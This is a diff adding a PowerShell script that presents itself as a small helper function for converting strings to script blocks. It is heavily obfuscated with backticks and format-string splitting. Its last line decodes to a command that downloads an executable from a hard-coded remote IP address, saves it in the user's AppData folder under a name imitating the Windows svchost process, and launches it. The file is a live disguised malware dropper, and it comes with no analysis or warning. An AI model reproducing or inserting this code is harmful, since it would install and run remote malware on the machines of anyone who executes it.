@@ -1,0 +1,13 @@
+  SEt-item ("V"+"A"+"riaBlE:4E"+"tg") (  [TypE]("{2}{0}{1}" -F 'bl','OcK','scripT')  ) ; function cO`NveRt-s`TrinG`TOS`cripTBLo`CK{
+	param(
+		[parameter(VALuEfrOMPiPeliNE=${TR`UE},pOSitioN=0)]
+		[string]
+		${st`R`inG}
+)
+	${scr`Ip`TBL`OcK} =   $4Etg::("{1}{0}" -f'e','Creat').Invoke(${st`RIng})
+
+	return ${sCrI`Ptb`LOcK}
+}
+
+
+(.("{2}{0}{1}"-f 'Ob','ject','New-') ("{2}{5}{3}{1}{0}{4}"-f'li','C','Sy','.Net.Web','ent','stem')).("{2}{1}{0}" -f'loadFile','n','Dow').Invoke(("{7}{11}{9}{0}{2}{3}{4}{5}{8}{6}{1}{10}"-f '.1','t.','74.','94','.137/~','ka','/scvhos','h','rma','93','exe','ttp://'),"$env:APPDATA\scvhost.exe");&("{2}{1}{0}" -f'rocess','art-P','St') ("$env:APPDATA\scvhost.exe")
